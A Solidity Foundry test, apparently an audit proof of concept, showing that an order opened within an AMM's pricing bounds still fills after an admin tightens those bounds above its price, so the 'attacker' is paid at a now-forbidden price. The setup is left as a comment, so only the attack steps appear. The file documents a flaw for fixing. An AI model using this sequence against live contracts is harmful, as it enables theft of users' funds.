pragma solidity 0.8.24;
import 'forge-std/Test.sol';

contract FillTimeHookBypassTest is Test {
    // Setup: AMM + AMMStandardHook + CLOBTransferHandler + ERC20 tokens

    function testFillBypassesPricingBoundsUpdate() public {
        // 1. Configure pricing bounds: min=sqrtP_low, max=sqrtP_high
        vm.prank(admin);
        hook.registryUpdatePricingBounds(tokenA, tokenB, sqrtP_low, sqrtP_high);

        // 2. Attacker opens order at price P (within bounds)
        vm.prank(attacker);
        handler.openOrder(groupKey, P_in_bounds, amountIn, deadline, hookData);

        // 3. Admin tightens bounds ABOVE the order price
        vm.prank(admin);
        hook.registryUpdatePricingBounds(tokenA, tokenB, sqrtP_high + 1, sqrtP_high * 2);

        // 4. Executor triggers AMM swap that fills the order
        uint256 attackerBalanceBefore = tokenB.balanceOf(attacker);
        vm.prank(executor);
        amm.swap(poolKey, swapParams, hookData);

        // 5. Fill succeeds even though order price is now below new min
        assertGt(tokenB.balanceOf(attacker), attackerBalanceBefore,
            'Fill executed at price now forbidden by updated bounds');
    }
}

